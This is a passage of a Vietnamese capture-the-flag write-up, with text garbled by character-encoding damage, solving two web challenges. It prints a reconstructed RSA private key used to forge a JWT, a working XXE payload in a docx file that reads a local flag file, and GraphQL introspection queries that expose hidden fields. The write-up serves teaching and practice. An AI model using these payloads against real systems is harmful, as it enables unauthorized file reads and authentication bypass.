p = 31215741529396018812515417004134640787100009229316578288055352664708168865021272656000536899262237216860631014075314842117554610007584785247528295532050275281897604417282764201663808807866131061076109621186637487629104138790759152498808113255780623797965160486898486555778008939394145890311055258828954190178308166849200055982547690198347288279757383042462314793013547724250691979344270237100766694204909177118595054123447170601665312594417746437903137541815770388130579095016109991522854975636849723595280170415639640162352734245874461220998563696559283552786805218843463196427525233172636749571243928543303580034013
q = 30402875697527916397542806353742730596622654442106746350302238894535593339396455455591735451368472859476854630199750179547832911945983758029765757595944788994736200573660086736656535295280090525416332242026647058207466614733384683340253505694485121034528875758567312719588900446459838347913647592922250427872627540821441178997866779901629507417372874038905138874416375338163783306116392413078042237174844547262385443713228361726655568925316249089735893321976177123750174713558046420139158973584145499695359980069043188006927965179450759298726183987751273054613710406588107926281039974244219480943101454735002864334529

N = p*q

key = RSA.construct((N,e, pow(e,-1,(p-1)*(q-1)),p,q))

print(key.export_key().decode())
```

m√£ PEM final:
```bash
-----BEGIN RSA PRIVATE KEY-----
MIIJKQIBAAKCAgEA6KFTFdIRYOkFDi7A7IcJquX3t6+YDbMmM3vs2yzoGSwS5weQ
DIi8Nkqw0dEPcSdcs4ubb6nKs0LhRzZ3bg3A7jFwkTCLnBEEAuXMtP2fWhyEy+kC
L1D9f+DN0lrM5JPByVPc8neQ6Jk7V8xHdwO6rDvNsOfgGgh8uo6gMozxIq4FGqfZ
i4X65hlsa05ODmLRZvHew/GhlrohhTHysiF0rIYn3rsMBUKMnoOP1OAJaTpu2CPN
CLSQrgOWSqlsI2ndJazlJb0T8PDAq9zgO09b5zq+zeooNy1kcrZT2OQkbYkOR6ai
ZvhivlgPtut3+a1AV4sBYg8saTFh9qey3ls7GK4UaPx7csD6LGlsTvQ/OKIxUb4z
nmBiNbFmche4Hv9abFwLT61jokXlF8xsiTVhXE8Y4++/+uQ38YVTW4yVPPrI7VVb
1brurpaTJx1frdAeIJtsUYzcFKOPNpY7SlGNGdlbIaetrHKuYCq7T1ToIIwsyLkE
Sy9r19fLXFF81TX9Rr/g2wtPhjj5n8X3w99f25CexIBk98KYVuRbuoKLLxHMmALg
iiLrrQVlRWEe8fwOcrSvTJZCzF1oiMr8nD1a/s6mvfAAZkh9DTXcVcf1oaq8AKPj
QlezoacOzVrcuPk5Hm61bzlQccuf/2VJ/Pb3ZSl2YHgVgIKoxBjjBpQSJ50CAwEA
AQKCAgAW+ReDaCNfNqPRKrzSnuNNhThZY3XYpIB5RRu26VBia//R4OVQ14/+rJGZ
ptOnkQOOl5LaDCKAYXJt3esday5KV4eOTwT6fJOw1ZDJruI1u+tBV9lnYtAl+MVa
qKzjRdQ1VZrUNwqQbdF2ci38itm8eItvlPaEm6H1qnAXjeOiUR0f7MOHC8wjPQ9/
6VO8B/Y1/FzLbOlQQUFeLfiRrswe3YDCdiZRvqi0XrmthBJp2eNoZOCyo2JGTQRi
iyiqtqGoPtLCT1HQ0XW1gzKBqOyigSKmoyElkc4Bpg/Rs3YFeyt11/bhxFW8BmZG
4ioO9hUMkCWq0WTJXp8WBKmdW9USAqrS8MF1wft0tOpZa47Y7pnGxfNZYP6zxtLa
X8FNWr0zTRtNhRcFBfKbNRorlWfBc9mtwujtyNj25+3Owm7Rgevl6irBgMbutZ35
btQNnYLHNCC6PvjtD1pDMoCoekozM/7Qm9VJeKVx1MbvzHqg+VYmJ+JeH4aJ9F8N
53jf2b6hETYmMQaRyHrP/NupNhtlant4uQtdeI8ZY4jOCR+hIludPRNdfRjm1llz
i1dNfVK8/bYlrNptPw4209pkvCmJ3Qo05iLLpEqhHTzG3MUUozDc56prQpQS1icZ
LiRVjNELAQnsfdCDmvJWirJDFUVFHlgmew2SESxRrlOiWfGoAQKCAQEA90a74xaQ
4HZOte3HzLPyOoFk6X6Sy6KCrrqKtoSWbxob6EuCADEARcaRR3ubvJxCpdCZOuFu
uUvN3LcqXk21cxqA7p7YvqJZt2I8qgMryTByRzzxcC1jg/BMLMQ2nkjYYeHtpcgg
omtqr3EizsR5CLl5w3G7BtNC20qhtbCBz1tld5Od0sRRtH1FDVZV+TxoNVA2KXh6
LPYv+a/4AcQoxxE7KdFbAbvK4JRZWcvN8t3Df2jPXjPquiMoQ+9IAW0saHv6BxLl
ZpbSZzyhJUBVNTK6V1PcDLYT1qxhO+yTP6TqUkujph6VvhNMN80S5bvvULgsJrja
7J/HCClz6ECj3QKCAQEA8NZQjp6IgTf45np65WXB6ucW7Z88xhw6OmtNfJYPhgYq
tFu0WIda6+G5KUb44WEmfh9oRTfBk2WpejkywOMP4usvuKtwWK5ywPGqVvsvX9Ug
7GU8DLwjqe6OxbaQQtMRwXDLKTftW9rAjFjdmGWTGr5TJpmahrXzzaE7dT2jW0z2
fX6gnZ3DlgZNwpzCUYu8icnXQjGIgTNSKjBJOu/Bi7sP7PidjIYdqgakUtdhPgbS
obCt1QIkCBQYnSeR/z2kkk7DQ3ESex/sptX4m+gwmgaUwVpwOKnMspAEHwlRCByY
qBW4SFEhiGjiIMxtuZB8+1fNqh8OD5ynNJa82n42wQKCAQEA9BKtggjUF7qvFoQN
otA7V+RAZvi4jKdrtmwKXv2gPynWQgPF3cqAKl9FJvmrTxAt+N1dYfECCYP5PtLM
zyiE4YhXmzDPX9uAErK0jlty7LMVGZvd9IvYnnKhvc4u2y2r53HJ0Mko7Sh5tZJG
eTEVBreMqI2pvaLpaurPkzcV6kaccNsT/OYqf6zma7O8SLaHZZg23dg9QAQAdsRq
V9P3LAamDzDGU3+5UNMdHrU8I20herFJfgJgvjnVlLiqqj3Ih5lXwYO1Sv2z0JLX
vJ0zfb8Ejw4HNcTC8DJWB4AMF9YANBrU/TNTOrpxkOKqtHg8T8B6U/5CmS1cl4HT
Fnw3QQKCAQEAyEzWTudXDHFq1vVCxQsujpmHnjVzrCjJ3NBlb5q2ancyiTJD+eUJ
H2lqQARA9eGAzCB+7iKDIn3IyFhN99Jg4g9Mb0BWfcsIsaPMUe8y5XcynKlNmiHX
X3uCzrkZnhpBiCqxLSTQijaTMaavFhJUmEd2jIHv3N3zWTAhbU7IUCTgVFs+ZhhS
FLJFdfg+POgE9GwkVW8w4pO2YFQsc5H33KjFhAb5sWfRwBkqDaQHwjiWcdepm6De
KsHb/shsSmYQO4a6K5sdDb3taoxG6hPgaBnVGkKHVvkRv+i7JLzw4dg2toTp8WtY
gkUI3NJo545eBARwjm6pmR5mifxcMTQLgQKCAQAkgOFRQ1PHJM6Ufzlh7K0dnIIk
9JuamjlY4UVbyeiNgCQ6FNgxmDTsyBUHJhayCH7sinT24nhg2zFUawUwbIOGzp0T
rKE8rsSspzUHweW0BPByxtDJbZT20zzbDbwamsmlHQ627tYkvAX+yL+Cin59nBRv
gPmrqMa1Xy2cGWEAmNtlfEP0ibxgBBCGzRoH/E+a0uQbB5IJVZsUv0xq1Ij6gbYq
sz5Pln+ab9Wcyq/stdpBZj1N438QaDVuDDQUaEkXcGwcTDYtlRIqsp3ZcEN74Pls
vCcPe1Dc5iT/3JFDlnxduRd1gzGON0Pabw6DCwCgCr8RwmfuSQ+YLNs/b9V1
-----END RSA PRIVATE KEY-----
```

s·ª≠ d·ª•ng c√¥ng c·ª• so kh·ªõp v·ªõi m√£ khuy·∫øt thi·∫øu th√¨ th·∫•y n√≥ gi·ªëng nhau r·ªìi, tuy·ªát v·ªùi !!!!!!!!!!!! m√¨nh ƒë√£ thu ph·ª•c ƒë∆∞·ª£c m√£ PEM ! pikachu!

### 2. S·ª≠a ƒë·ªïi JWT

mu·ªën s·ª≠a ƒë∆∞·ª£c JWT c·∫ßn 2 kho√° l√† private v√† public , ta c√≥ th·ªÉ t·∫°o ra kho√° public t·ª´ private nh∆∞ sau:
> openssl pkey -in key_redacted.pem -pubout

kho√° public tr√¥ng nh∆∞ sau:
```bash
-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA6KFTFdIRYOkFDi7A7IcJ
quX3t6+YDbMmM3vs2yzoGSwS5weQDIi8Nkqw0dEPcSdcs4ubb6nKs0LhRzZ3bg3A
7jFwkTCLnBEEAuXMtP2fWhyEy+kCL1D9f+DN0lrM5JPByVPc8neQ6Jk7V8xHdwO6
rDvNsOfgGgh8uo6gMozxIq4FGqfZi4X65hlsa05ODmLRZvHew/GhlrohhTHysiF0
rIYn3rsMBUKMnoOP1OAJaTpu2CPNCLSQrgOWSqlsI2ndJazlJb0T8PDAq9zgO09b
5zq+zeooNy1kcrZT2OQkbYkOR6aiZvhivlgPtut3+a1AV4sBYg8saTFh9qey3ls7
GK4UaPx7csD6LGlsTvQ/OKIxUb4znmBiNbFmche4Hv9abFwLT61jokXlF8xsiTVh
XE8Y4++/+uQ38YVTW4yVPPrI7VVb1brurpaTJx1frdAeIJtsUYzcFKOPNpY7SlGN
GdlbIaetrHKuYCq7T1ToIIwsyLkESy9r19fLXFF81TX9Rr/g2wtPhjj5n8X3w99f
25CexIBk98KYVuRbuoKLLxHMmALgiiLrrQVlRWEe8fwOcrSvTJZCzF1oiMr8nD1a
/s6mvfAAZkh9DTXcVcf1oaq8AKPjQlezoacOzVrcuPk5Hm61bzlQccuf/2VJ/Pb3
ZSl2YHgVgIKoxBjjBpQSJ50CAwEAAQ==
-----END PUBLIC KEY-----
```

kh√† kh√† , b√¢y gi·ªù th√¨ v√†o jwt.io s·ª≠a l·∫°i token th√¥i, nh·ªõ th√™m 2 lo·∫°i m√£ n√†y v√†o nh√©.

![](https://hackmd.io/_uploads/HyuGborin.png)


oke ta ƒë√£ c√≥ ƒë∆∞·ª£c token r·ªìi nh√©, ƒë·ªÉ xem b√™n trong web c√≥ c√°i g√¨ n√†o !!!!!

![](https://hackmd.io/_uploads/BJpzZoSjh.png)


s·ª≠a l·∫°i token ch·ªó n√†y nh√©. v√† reload l·∫°i trang


![](https://hackmd.io/_uploads/H1xmZsro2.png)


kh√† kh√† v√†o ƒë∆∞·ª£c b√™n trong r·ªìi, m·ªôt ch·ª©c nƒÉng upload xu·∫•t hi·ªán. HO√° ra ƒë√¢y ch√≠nh l√† n·ªõi m√† g·ª£i √Ω b√†i n√≥i t·ªõi


### ƒê·ªçc flag th√¥ng qua Upload file

hmmm, xem n√†o: tr∆∞·ªõc h·∫øt ch·ª©c nƒÉng upload ch·ªâ cho ph√©p upload file docx, ƒë·ªÅ b√†i cho path c·ªßa flag l√† /home/chall/flag.tx.

m√¨nh th·ª≠ upload m·ªôt file b·∫•t k·ª≥ th√¨ th·∫•y hi·ªán d√≤ng ch·ªØ. `Thanks, for applying your CV consist 2 words ! you will receive a update soon.`

![](https://hackmd.io/_uploads/r1ImZoBsh.png)


M√¨nh ƒëo√°n ch·ª´ng l√† ·ª©ng d·ª•ng web ƒë·∫øm s·ªë t·ª´ c√≥ trong file word v√† render ra m√†n h√¨nh. V·∫≠y th√¨ qu√° r√µ, g·ªôp to√†n b·ªô d·ªØ ki·ªán l·∫°i m√¨nh c√≥ th·ªÉ k·∫øt lu·∫≠n ƒë√¢y l√† l·ªó h·ªïng XXE.

M√¨nh s·∫Ω gi·∫£i th√≠ch nh∆∞ n√†y nh√©: th·ª±c ch·∫•t th√¨ file docx ch√≠nh l√† ZIP c·ªßa nhi·ªÅu file XML l·∫°i v·ªõi nhau.
c·∫•u tr√∫c file docx s·∫Ω g·ªìm c√°c file:
'[Content_Types].xml', th∆∞ m·ª•c docProps, th∆∞ m·ª•c _rels, th∆∞ m·ª•c word.

trong c√°c th∆∞ m·ª•c n√†y s·∫Ω ch·ª©a c√°c t·ªáp xml.

tr∆∞·ªõc h·∫øt th√¨ ta c·∫ßn bi·∫øt ch·ªó render ra s·ªë t·ª´ ƒë∆∞·ª£c s·ª≠ l√Ω ·ªü ch·ªó n√†o.

sau khi t√¨m hi·ªÉu th√¨ m√¨nh th·∫•y n√≥ ƒë∆∞·ª£c x·ª≠ l√Ω trong file app.xml trong th∆∞ m·ª•c docProps

m√¨nh s·∫Ω t·∫°o m·ªôt file docx m·ªõi tinh , r·ªìi gi·∫£i n√©n ƒë·ªÉ l·∫•y c√°c file th√†nh ph·∫ßn:

m√¨nh s·∫Ω s·ª≠a file app.xml th√†nh nh∆∞ sau:
```bash
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///home/ctf/chall/flag.txt" >]>
<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties" xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes"><Template>Normal</Template><TotalTime>0</TotalTime><Pages>1</Pages><Words>&xxe;</Words><Characters>16</Characters><Application>Microsoft Office Word</Application><DocSecurity>0</DocSecurity><Lines>1</Lines><Paragraphs>1</Paragraphs><ScaleCrop>false</ScaleCrop><Company></Company><LinksUpToDate>false</LinksUpToDate><CharactersWithSpaces>17</CharactersWithSpaces><SharedDoc>false</SharedDoc><HyperlinksChanged>false</HyperlinksChanged><AppVersion>14.0000</AppVersion></Properties>
```

r·ªìi sau ƒë√≥ m√¨nh s·∫Ω ZIP tr·ªü l·∫°i nh∆∞ c≈© b·∫±ng l·ªánh:
> zip test.docx docProps/app.xml

B√¢y gi·ªù ch√∫ng ta ch·ªâ c·∫ßn upload file n√†y l√™n h·ªá th·ªëng v√† l·∫•y flag th√¥i . hihihihi

![](https://hackmd.io/_uploads/HyTQWoHsh.png)



![](https://hackmd.io/_uploads/HJ-4ZoBs2.png)



Flag: `GLUG{n3v3r_g1v3_up!!!}`


# inspect (WEB)

## Description:  Nghƒ© ƒë∆°n gi·∫£n th√¥i, l√†m cho n√≥ ch·∫°y l√† ƒë∆∞·ª£c!!!
> url: http://chall.foobar.nitdgplug.org:30045

## Solution:
Sau khi truy c·∫≠p v√† url ta nh·∫≠n ƒë∆∞·ª£c m√†n h√¨nh tr·∫Øng tinh v·ªõi d√≤ng ch·ªØ Cannot GET /

![](https://hackmd.io/_uploads/rkarGjHsh.png)

B∆∞·ªõc ƒë·∫ßu ti√™n th√¨ c·ª© d√πng dirsearch ƒë·ªÉ qu√©t th∆∞ m·ª•c tr∆∞·ªõc ƒë√£.
M√¨nh t√¨m th·∫•y m·ªôt ƒë∆∞·ªùng d·∫´n sau:
> http://chall.foobar.nitdgplug.org:30045/graphql

ƒêo√°n ch·ª´ng b√†i kh·∫≥ nƒÉng l√† tr√≠ch xu·∫•t th√¥ng tin c·ªßa Object trong graphQL.

![](https://hackmd.io/_uploads/BySLGsHjn.png)

Th·ª≠ payload:

> {__schema{types{name,fields{name}}}}

Payload n√†y ho·∫°t ƒë·ªông t·ª©c l√† ch·ª©c nƒÉng Introspection ƒë∆∞·ª£c enabled.

payload: li·ªát k√™ to√†n b·ªô Object

ƒê√¢y l√† l∆∞·ª£c ƒë·ªì cho ƒë·ªëi t∆∞·ª£ng RootQuery, l√† ƒëi·ªÉm b·∫Øt ƒë·∫ßu cho t·∫•t c·∫£ c√°c truy v·∫•n trong API GraphQL. L∆∞·ª£c ƒë·ªì x√°c ƒë·ªãnh c·∫•u tr√∫c c·ªßa ƒë·ªëi t∆∞·ª£ng RootQuery, bao g·ªìm t√™n, m√¥ t·∫£ v√† c√°c tr∆∞·ªùng c·ªßa n√≥. ƒê√¢y l√† m·ªôt s·ª± c·ªë c·ªßa l∆∞·ª£c ƒë·ªì:

ƒê·ªëi t∆∞·ª£ng RootQuery c√≥ b·ªën tr∆∞·ªùng: secret, events, bookings, login.
Tr∆∞·ªùng b√≠ m·∫≠t tr·∫£ v·ªÅ danh s√°ch c√°c ƒë·ªëi t∆∞·ª£ng Flag kh√¥ng r·ªóng.
Tr∆∞·ªùng s·ª± ki·ªán tr·∫£ v·ªÅ m·ªôt danh s√°ch c√°c ƒë·ªëi t∆∞·ª£ng S·ª± ki·ªán kh√¥ng ph·∫£i l√† null.
Tr∆∞·ªùng ƒëƒÉng k√Ω tr·∫£ v·ªÅ m·ªôt danh s√°ch c√°c ƒë·ªëi t∆∞·ª£ng ƒêƒÉng k√Ω kh√¥ng r·ªóng.
Tr∆∞·ªùng ƒëƒÉng nh·∫≠p c√≥ hai ƒë·ªëi s·ªë, t√™n ng∆∞·ªùi d√πng v√† m·∫≠t kh·∫©u, c·∫£ hai ƒë·ªÅu l√† ƒë·ªëi t∆∞·ª£ng Chu·ªói kh√¥ng null. N√≥ tr·∫£ v·ªÅ m·ªôt ƒë·ªëi t∆∞·ª£ng AuthData kh√¥ng null.
M·ªói tr∆∞·ªùng trong ƒë·ªëi t∆∞·ª£ng RootQuery c√≥ t√™n, m√¥ t·∫£, danh s√°ch ƒë·ªëi s·ªë (n·∫øu c√≥), lo·∫°i v√† tr·∫°ng th√°i ng·ª´ng s·ª≠ d·ª•ng. Lo·∫°i c·ªßa t·ª´ng tr∆∞·ªùng c√≥ th·ªÉ l√† lo·∫°i v√¥ h∆∞·ªõng (nh∆∞ Chu·ªói), lo·∫°i ƒë·ªëi t∆∞·ª£ng (nh∆∞ S·ª± ki·ªán ho·∫∑c ƒê·∫∑t ch·ªó) ho·∫∑c danh s√°ch ho·∫∑c tr√¨nh bao b·ªçc kh√¥ng null xung quanh m·ªôt lo·∫°i (nh∆∞ danh s√°ch kh√¥ng null c·ªßa c√°c ƒë·ªëi t∆∞·ª£ng S·ª± ki·ªán kh√¥ng null) .


v√¨ v·∫≠y ch√∫ng ta c·∫ßn query v√†o tr∆∞·ªùng secret ƒë·ªÉ g·ªçi t·ªõi ƒë·ªëi t∆∞·ª£ng Flag. 


ƒê·ªÉ tr√≠ch xu·∫•t th√¥ng tin c·ªßa tr∆∞·ªùng text trong ƒë·ªëi t∆∞·ª£ng Flag, b·∫°n c√≥ th·ªÉ s·ª≠ d·ª•ng truy v·∫•n GraphQL nh∆∞ sau:

```php
{
  secret {
    text
  }
}

```
Trong ƒë√≥, secret l√† t√™n tr∆∞·ªùng trong RootQuery ch·ª©a danh s√°ch c√°c ƒë·ªëi t∆∞·ª£ng Flag. text l√† tr∆∞·ªùng c·∫ßn tr√≠ch xu·∫•t t·ª´ m·ªói ƒë·ªëi t∆∞·ª£ng Flag. K·∫øt qu·∫£ tr·∫£ v·ªÅ s·∫Ω l√† m·ªôt danh s√°ch c√°c gi√° tr·ªã text t·ª´ c√°c ƒë·ªëi t∆∞·ª£ng Flag trong tr∆∞·ªùng secret.

![](https://hackmd.io/_uploads/SyvPGiBjh.png)

Ok b√¢y gi·ªù ch√∫ng ta c√≥ ƒë∆∞·ª£c m·ªôt ƒë·ªëng c·ªù gi·∫£.

search t·ª´ kho√° : flag ta nh·∫≠n ƒë∆∞·ª£c c·ªù th·∫≠t

![](https://hackmd.io/_uploads/H1aDziBo2.png)

Flag:  `GLUG{1nsp3c7_1n_gr4phq6}`

